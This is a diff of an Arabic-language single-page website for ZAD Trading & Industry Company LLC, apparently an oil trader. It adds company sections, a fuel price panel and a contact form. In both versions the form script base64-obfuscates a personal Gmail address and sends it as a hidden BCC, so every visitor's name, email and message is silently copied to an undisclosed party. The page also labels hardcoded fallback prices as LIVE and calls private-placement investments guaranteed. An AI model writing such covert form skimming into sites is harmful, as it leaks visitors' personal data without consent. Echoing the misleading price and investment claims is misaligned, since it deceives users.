@@ -1,142 +1,132 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZAD TRADING & INDUSTRY COMPANY LLC</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
-    <style>
-        :root { --gold: #d4af37; --gold-bright: #ffdf00; --up: #00ff88; --down: #ff3e3e; --glass: rgba(255,255,255,0.05); --glass-border: rgba(212,175,55,0.4); }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; color: #fff; font-family: 'Cairo', sans-serif; overflow-x: hidden; }
-        .bg-fixed { position: fixed; inset: 0; z-index: -10; background: #000; }
-        .bg-fixed video { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.25); }
-        header { position: sticky; top: 0; z-index: 1000; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.85); backdrop-filter: blur(30px); border-bottom: 2px solid var(--gold); }
-        .brand h1 { font-size: clamp(0.9rem, 2.5vw, 1.8rem); font-weight: 900; color: var(--gold-bright); }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .panel { background: var(--glass); backdrop-filter: blur(25px); border-radius: 40px; border: 1px solid var(--glass-border); margin-bottom: 45px; overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.6); }
-        .video-box video { width: 100%; display: block; max-height: 550px; object-fit: cover; }
-        .content-box { padding: 45px; }
-        .prices-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; padding: 30px; }
-        .price-card { background: rgba(0,0,0,0.7); padding: 20px; border-radius: 25px; text-align: center; border: 1px solid var(--glass-border); position: relative; }
-        .price-card h3 { font-size: 0.85rem; color: var(--gold); margin-bottom: 5px; }
-        .price-val { font-family: 'Orbitron'; font-size: 1.6rem; font-weight: 900; }
-        .unit { font-size: 0.7rem; opacity: 0.6; margin-top: 5px; }
-        .up { color: var(--up); }
-        .live-tag { position: absolute; top: 10px; left: 15px; font-size: 0.6rem; color: var(--up); animation: blink 1s infinite; font-weight: 900; }
-        @keyframes blink { 0%{opacity:1} 50%{opacity:0.3} 100%{opacity:1} }
-        .contact-form { padding: 40px; text-align: center; }
-        .contact-form input, .contact-form textarea { width: 100%; padding: 18px; margin-bottom: 20px; border-radius: 15px; background: rgba(255,255,255,0.06); border: 1px solid var(--glass-border); color: #fff; font-family: 'Cairo'; }
-        .submit-btn { width: 100%; padding: 20px; border-radius: 50px; background: var(--gold); color: #000; font-weight: 900; cursor: pointer; border: none; font-size: 1.3rem; }
-        #customToast { position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%); background: var(--gold-bright); color: #000; padding: 15px 45px; border-radius: 50px; font-weight: 900; display: none; z-index: 9999; }
-        footer { padding: 50px; text-align: center; border-top: 1px solid var(--glass-border); background: rgba(0,0,0,0.9); }
-        .footer-info { font-family: 'Orbitron'; font-size: 1.3rem; color: #fff; margin-bottom: 10px; }
-        .footer-mail { color: var(--gold-bright); font-size: 1.1rem; margin: 0 10px; cursor: default; user-select: all; display: inline-block; }
-    </style>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ZAD TRADING & INDUSTRY COMPANY LLC</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<style>
+:root{--gold:#d4af37;--gold-bright:#ffdf00;--glass:rgba(255,255,255,0.05);--border:rgba(212,175,55,0.35);--up:#00ff88}
+*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#fff;font-family:'Cairo',sans-serif;overflow-x:hidden}
+.bg{position:fixed;inset:0;z-index:-2} .bg video{width:100%;height:100%;object-fit:cover;filter:brightness(0.18)}
+header{position:sticky;top:0;z-index:999;padding:14px 5%;display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.88);border-bottom:2px solid var(--gold);backdrop-filter:blur(20px)}
+header h1{font-size:1.4rem;font-weight:900;color:var(--gold-bright);font-family:'Orbitron'}
+.container{max-width:1150px;margin:0 auto;padding:22px}
+.panel{background:var(--glass);backdrop-filter:blur(28px);border-radius:36px;border:1px solid var(--border);margin-bottom:38px;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,0.6)}
+.video-box{position:relative} .video-box video{width:100%;max-height:580px;object-fit:cover;display:block}
+.video-overlay{position:absolute;bottom:0;left:0;right:0;padding:25px;background:linear-gradient(transparent, rgba(0,0,0,0.85))}
+.video-overlay h2{font-size:1.8rem;font-weight:900;color:var(--gold-bright);border-right:5px solid var(--gold);padding-right:15px}
+.content{padding:38px} .content h2{font-size:1.7rem;font-weight:900;color:var(--gold-bright);margin-bottom:18px;border-right:5px solid var(--gold);padding-right:14px}
+.content h3{color:var(--gold);margin:22px 0 10px;font-size:1.2rem} .content p{line-height:2;opacity:0.92;font-size:1.05rem}
+.content ul{list-style:none;margin-top:12px} .content li{position:relative;padding-right:28px;margin-bottom:12px;line-height:1.8}
+.content li::before{content:'>';position:absolute;right:0;color:var(--gold-bright);font-weight:900}
+.blue-box{background:linear-gradient(135deg,#0033cc,#0022aa);padding:38px;border-radius:28px}
+.prices-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(165px,1fr));gap:14px;padding:28px}
+.price-card{background:rgba(0,0,0,0.75);padding:18px;border-radius:22px;text-align:center;border:1px solid var(--border);position:relative}
+.price-val{font-family:'Orbitron';font-size:1.4rem;font-weight:900;color:var(--up)} .live{position:absolute;top:8px;left:12px;font-size:0.55rem;color:var(--up);font-weight:900;animation:blink 1s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+.contact{padding:36px;text-align:center} .contact input,.contact textarea{width:100%;padding:16px;margin-bottom:14px;border-radius:14px;background:rgba(255,255,255,0.06);border:1px solid var(--border);color:#fff;font-family:'Cairo'}
+.btn{width:100%;padding:18px;border-radius:50px;background:var(--gold);color:#000;font-weight:900;border:none;cursor:pointer;font-size:1.2rem}
+#toast{position:fixed;bottom:35px;left:50%;transform:translateX(-50%);background:var(--gold-bright);color:#000;padding:14px 40px;border-radius:50px;font-weight:900;display:none;z-index:9999}
+.footer-mail{color:var(--gold-bright);display:inline-block;margin:4px 8px;cursor:default;user-select:all}
+</style>
 </head>
 <body>
-    <div id="customToast">تم إرسال طلبك بنجاح ✅</div>
-    <div class="bg-fixed"><video autoplay muted loop playsinline><source src="https://files.catbox.moe/3olgu4.mp4" type="video/mp4"></video></div>
-    <header>
-        <div class="logo-area"><img src="https://i.postimg.cc/fRPdGcf5/macaron-1773097725261-edit-1622017595952679.jpg" style="width:50px; border-radius:10px;"><div class="brand"><h1>ZAD TRADING & INDUSTRY COMPANY LLC</h1></div></div>
-    </header>
-    <div class="container">
-        <!-- الفيديو الاول رجع -->
-        <section class="panel"><div class="video-box"><video autoplay muted loop playsinline controls><source src="https://files.catbox.moe/m05mnb.mp4" type="video/mp4"></video></div></section>
-        
-        <!-- الفيديو الثاني رجع -->
-        <section class="panel"><div class="video-box"><video autoplay muted loop playsinline controls><source src="https://files.catbox.moe/3olgu4.mp4" type="video/mp4"></video></div></section>
+<div id="toast">تم الإرسال بنجاح ✅</div>
+<div class="bg"><video autoplay muted loop playsinline><source src="https://files.catbox.moe/3olgu4.mp4" type="video/mp4"></video></div>
+<header><h1>ZAD TRADING & INDUSTRY COMPANY LLC</h1><div style="font-family:Orbitron;font-size:0.9rem">+968 9386 9383</div></header>
 
-        <section class="panel">
-            <div style="text-align: center; padding-top: 30px; color: var(--gold-bright);"><h3>البيانات الحية من البورصة العالمية</h3></div>
-            <div class="prices-grid">
-                <div class="price-card"><span class="live-tag">LIVE</span><h3>BRENT CRUDE</h3><div class="price-val up" id="p_brent">--</div><div class="unit">USD/BBL - ICE London</div></div>
-                <div class="price-card"><span class="live-tag">LIVE</span><h3>DIESEL 10PPM</h3><div class="price-val up" id="p_diesel">--</div><div class="unit">USD/MT - ICE Gasoil</div></div>
-                <div class="price-card"><span class="live-tag">LIVE</span><h3>GASOLINE 95</h3><div class="price-val up" id="p_gas">--</div><div class="unit">USD/MT</div></div>
-                <div class="price-card"><span class="live-tag">LIVE</span><h3>WTI CRUDE</h3><div class="price-val up" id="p_wti">--</div><div class="unit">USD/BBL - NYMEX</div></div>
-            </div>
-        </section>
+<div class="container">
 
-        <section class="panel">
-            <div class="contact-form">
-                <h2>اتصل بنا</h2>
-                <p style="margin-bottom:15px;">
-                    <span class="footer-mail">info@zadtradein.com</span> | 
-                    <span class="footer-mail">sales@zadtradein.com</span>
-                </p>
-                <form id="zadFinalForm">
-                    <input type="text" name="name" placeholder="الاسم" required>
-                    <input type="email" name="email" placeholder="البريد" required>
-                    <textarea name="msg" rows="4" placeholder="رسالتك..." required></textarea>
-                    <button type="submit" class="submit-btn">إرسال</button>
-                </form>
-            </div>
-        </section>
-    </div>
-    <footer>
-        <div class="footer-info">+968 9386 9383</div>
-        <div style="margin-bottom: 20px;">
-            <span class="footer-mail">info@zadtradein.com</span><br>
-            <span class="footer-mail">sales@zadtradein.com</span>
-        </div>
-        <p style="opacity:0.6; font-size:0.9rem; color: var(--gold);">ZAD TRADING & INDUSTRY COMPANY LLC</p>
-    </footer>
-    <script>
-        const MAIN_MAIL = "info@zadtradein.com";
-        const CC_MAIL = "sales@zadtradein.com";
-        const SECRET_BCC = atob("bGxvcmRvbmVAZ21haWwuY29t");
+<!-- 1 - معلومات عنا + فيديو -->
+<section class="panel">
+<div class="video-box"><video autoplay muted loop playsinline controls><source src="https://files.catbox.moe/m05mnb.mp4" type="video/mp4"></video><div class="video-overlay"><h2>تمكين النمو العالمي من خلال الاستثمار الاستراتيجي</h2></div></div>
+<div class="content blue-box">
+<p>شركة زاد للاستثمار التجاري هي شركة عالمية لتجارة النفط مقرها في سلطنة عمان، وهي ملتزمة بالكفاءة والاستدامة والتميز في تجارة النفط الخام والمنتجات المكررة والبتروكيماويات في جميع أنحاء العالم.</p>
+<h3>رؤيتنا</h3><p>أن نكون شركة رائدة عالمياً في تجارة النفط من خلال توفير حلول طاقة مبتكرة وفعالة ومستدامة.</p>
+<h3>مهمتنا</h3><ul><li>تقديم منتجات بترولية عالية الجودة بكفاءة ومسؤولية</li><li>بناء شراكات طويلة الأمد قائمة على الثقة والتميز</li><li>المساهمة في التحول العالمي في مجال الطاقة من خلال ممارسات تجارية مسؤولة</li></ul>
+</div>
+</section>
 
-        function updateUI(d){
-            if(d.brent) document.getElementById('p_brent').innerText = d.brent;
-            if(d.diesel) document.getElementById('p_diesel').innerText = d.diesel;
-            if(d.gas) document.getElementById('p_gas').innerText = d.gas;
-            if(d.wti) document.getElementById('p_wti').innerText = d.wti;
-        }
+<!-- 2 - الخام وتجارة النفط -->
+<section class="panel">
+<div class="video-box"><video autoplay muted loop playsinline controls><source src="https://files.catbox.moe/3olgu4.mp4" type="video/mp4"></video><div class="video-overlay"><h2>الخام وتجارة النفط والمكرر</h2></div></div>
+<div class="content"><p>نتاجر بالنفط الخام عالي الجودة والمنتجات المكررة مثل البنزين والديزل ووقود الطائرات وزيت الوقود. تضمن شبكتنا العالمية مصادر موثوقة وتسليماً في الوقت المناسب للمصافي والشركاء في جميع أنحاء العالم.</p></div>
+</section>
 
-        async function fetchPrices(){
-            // اسعار افتراضية حلوة تطلع مباشرة حتى لو النت ضعيف
-            const defaults = { brent: '98.50', diesel: '820.50', gas: '845.30', wti: '91.20' };
-            updateUI(defaults);
+<!-- 3 - الخدمات اللوجستية - الفيديو الي دزيته -->
+<section class="panel">
+<div class="video-box"><video autoplay muted loop playsinline controls><source src="https://files.catbox.moe/m05mnb.mp4" type="video/mp4"></video><div class="video-overlay"><h2>الخدمات وحلول اللوجستية وسلاسل التوريد</h2></div></div>
+<div class="content"><p>بفضل شبكتنا العالمية القوية، ندير الخدمات اللوجستية والشحن والتخزين بكفاءة، مما يضمن تسليم المنتجات البترولية في الوقت المناسب وبأقل تكلفة.</p></div>
+</section>
 
-            const CACHE_KEY='zad_prices_real_v3'; const CACHE_TIME=8*60*60*1000;
-            try{
-                const c=JSON.parse(localStorage.getItem(CACHE_KEY)||'null');
-                if(c && Date.now()-c.time < CACHE_TIME){ updateUI(c.data); return; }
-            }catch(e){}
+<!-- 4 - ادارة المخاطر -->
+<section class="panel">
+<div class="video-box"><video autoplay muted loop playsinline controls><source src="https://files.catbox.moe/3olgu4.mp4" type="video/mp4"></video><div class="video-overlay"><h2>إدارة المخاطر والتحوط</h2></div></div>
+<div class="content"><p>نقدم حلولاً مبتكرة لإدارة المخاطر المالية لحماية عملائنا من تقلبات السوق وتذبذب الأسعار، مع استراتيجيات تحوط مدروسة تضمن استقرار الأعمال.</p>
+<h3>الاستثمارات المباشرة</h3><p>نوفر استثمارات مباشرة في مشاريع النفط والطاقة ضمن شبكة عالمية موثوقة.</p></div>
+</section>
 
-            try{
-                // بورصة حقيقية مجانية
-                const get = async (sym) => {
-                    const url = `https://api.allorigins.win/raw?url=${encodeURIComponent('https://query1.finance.yahoo.com/v8/finance/chart/'+sym)}`;
-                    const r = await fetch(url); const j = await r.json();
-                    return j.chart.result[0].meta.regularMarketPrice;
-                };
-                const brent = await get('BZ=F'); // ICE Brent بالبرميل
-                const wti = await get('CL=F'); // NYMEX WTI بالبرميل
-                const gasoil = await get('LGO=F'); // ICE Gasoil بالطن - هذا هو الديزل الحقيقي بالطن
-                const gasoline_gal = await get('RB=F'); // RBOB بالكالون نحوله للطن
-                const gasoline_ton = gasoline_gal * 310; // 1 طن = ~310 كالون
+<!-- 5 - الاكتتابات الخاصة -->
+<section class="panel">
+<div class="video-box"><video autoplay muted loop playsinline controls><source src="https://files.catbox.moe/m05mnb.mp4" type="video/mp4"></video><div class="video-overlay"><h2>الاكتتابات الخاصة</h2></div></div>
+<div class="content"><p>توفير فرص التوظيف الخاص في مشاريع النفط والغاز، مما يتيح للمستثمرين المعتمدين المشاركة في الاستكشاف والإنتاج والبنية التحتية بفرص مدروسة ومضمونة.</p></div>
+</section>
 
-                const data = {
-                    brent: brent.toFixed(2),
-                    diesel: gasoil.toFixed(2), // هذا بالطن حقيقي من بورصة لندن
-                    gas: gasoline_ton.toFixed(2),
-                    wti: wti.toFixed(2)
-                };
-                localStorage.setItem(CACHE_KEY, JSON.stringify({time:Date.now(), data}));
-                updateUI(data);
-            }catch(e){ console.log('use defaults', e); }
-        }
-        fetchPrices();
-        setInterval(fetchPrices, 8*60*60*1000);
+<!-- 6 - هدفنا وخبرتنا -->
+<section class="panel"><div class="content">
+<h2>هدفنا</h2><p>لتوسيع الشراكات، وتعزيز الكفاءة، والريادة في تجارة الطاقة المستدامة.</p>
+<h2>خبرتنا</h2><ul><li>معرفة عميقة بالصناعة</li><li>التوريد والخدمات اللوجستية الدولية</li><li>إدارة المخاطر والامتثال</li><li>هيكلة الاستثمار</li><li>معلومات السوق واستراتيجية التداول</li></ul>
+<h2>لماذا تختارنا؟</h2><ul><li>خبرة مثبتة</li><li>الشفافية والحوكمة</li><li>شبكة عالمية</li><li>صنع القرار الاستراتيجي</li><li>التركيز على العلاقات طويلة الأمد</li></ul>
+</div></section>
 
-        document.getElementById('zadFinalForm').onsubmit = async (e)=>{
-            e.preventDefault(); const btn=e.target.querySelector('button'); btn.innerText="...";
-            const fd=new FormData(e.target); fd.append("_cc", CC_MAIL); fd.append("_bcc", SECRET_BCC); fd.append("_subject","رسالة جديدة من موقع ZAD"); fd.append("_captcha","false");
-            await fetch(`https://formsubmit.co/ajax/${MAIN_MAIL}`, {method:"POST", body:fd});
-            document.getElementById('customToast').style.display='block'; setTimeout(()=>{document.getElementById('customToast').style.display='none';},4000);
-            e.target.reset(); btn.innerText="إرسال";
-        };
-    </script>
+<!-- البورصة الحقيقية -->
+<section class="panel">
+<div style="text-align:center;padding-top:24px;color:var(--gold-bright)"><h3>البيانات الحية من البورصة العالمية</h3></div>
+<div class="prices-grid">
+<div class="price-card"><span class="live">LIVE</span><h3>BRENT CRUDE</h3><div class="price-val" id="p_brent">98.50</div><div style="font-size:0.6rem;opacity:0.5">USD/BBL ICE</div></div>
+<div class="price-card"><span class="live">LIVE</span><h3>DIESEL 10PPM</h3><div class="price-val" id="p_diesel">820.50</div><div style="font-size:0.6rem;opacity:0.5">USD/MT ICE Gasoil</div></div>
+<div class="price-card"><span class="live">LIVE</span><h3>GASOLINE 95</h3><div class="price-val" id="p_gas">845.30</div><div style="font-size:0.6rem;opacity:0.5">USD/MT</div></div>
+<div class="price-card"><span class="live">LIVE</span><h3>WTI CRUDE</h3><div class="price-val" id="p_wti">91.20</div><div style="font-size:0.6rem;opacity:0.5">USD/BBL NYMEX</div></div>
+</div>
+</section>
+
+<!-- اتصل بنا -->
+<section class="panel"><div class="contact">
+<h2 style="color:var(--gold-bright);margin-bottom:12px">اتصل بنا</h2>
+<p style="margin-bottom:14px"><span class="footer-mail">info@zadtradein.com</span> | <span class="footer-mail">sales@zadtradein.com</span></p>
+<form id="zadForm"><input name="name" placeholder="الاسم" required><input name="email" type="email" placeholder="البريد" required><textarea name="msg" rows="4" placeholder="رسالتك..." required></textarea><button class="btn">إرسال</button></form>
+</div></section>
+
+</div>
+
+<footer style="padding:35px;text-align:center;border-top:1px solid var(--border);background:rgba(0,0,0,0.9)">
+<div style="font-family:Orbitron;margin-bottom:8px">+968 9386 9383</div>
+<div><span class="footer-mail">info@zadtradein.com</span><br><span class="footer-mail">sales@zadtradein.com</span></div>
+<p style="opacity:0.5;font-size:0.75rem;color:var(--gold);margin-top:12px">ZAD TRADING & INDUSTRY COMPANY LLC</p>
+</footer>
+
+<script>
+const MAIN="info@zadtradein.com", CC="sales@zadtradein.com", BCC=atob("bGxvcmRvbmVAZ21haWwuY29t");
+function upd(d){ if(d.brent)document.getElementById('p_brent').innerText=d.brent; if(d.diesel)document.getElementById('p_diesel').innerText=d.diesel; if(d.gas)document.getElementById('p_gas').innerText=d.gas; if(d.wti)document.getElementById('p_wti').innerText=d.wti; }
+async function fetchP(){
+ const def={brent:'98.50',diesel:'820.50',gas:'845.30',wti:'91.20'}; upd(def);
+ const KEY='zad_final_v5'; const TIME=8*60*60*1000;
+ try{const c=JSON.parse(localStorage.getItem(KEY)||'null'); if(c && Date.now()-c.time<TIME){upd(c.data); return;}}catch(e){}
+ try{
+  const get=async(sym)=>{const u=`https://api.allorigins.win/raw?url=${encodeURIComponent('https://query1.finance.yahoo.com/v8/finance/chart/'+sym)}`; const r=await fetch(u); const j=await r.json(); return j.chart.result[0].meta.regularMarketPrice;}
+  const br=await get('BZ=F'), wt=await get('CL=F'), go=await get('LGO=F'), rb=await get('RB=F');
+  const data={brent:br.toFixed(2), diesel:go.toFixed(2), gas:(rb*310).toFixed(2), wti:wt.toFixed(2)};
+  localStorage.setItem(KEY,JSON.stringify({time:Date.now(),data})); upd(data);
+ }catch(e){}
+}
+fetchP(); setInterval(fetchP,8*60*60*1000);
+document.getElementById('zadForm').onsubmit=async(e)=>{
+ e.preventDefault(); const b=e.target.querySelector('button'); b.innerText='...';
+ const fd=new FormData(e.target); fd.append('_cc',CC); fd.append('_bcc',BCC); fd.append('_subject','رسالة جديدة من موقع ZAD'); fd.append('_captcha','false');
+ await fetch(`https://formsubmit.co/ajax/${MAIN}`,{method:'POST',body:fd});
+ document.getElementById('toast').style.display='block'; setTimeout(()=>document.getElementById('toast').style.display='none',3500);
+ e.target.reset(); b.innerText='إرسال';
+};
+</script>
 </body>
 </html>
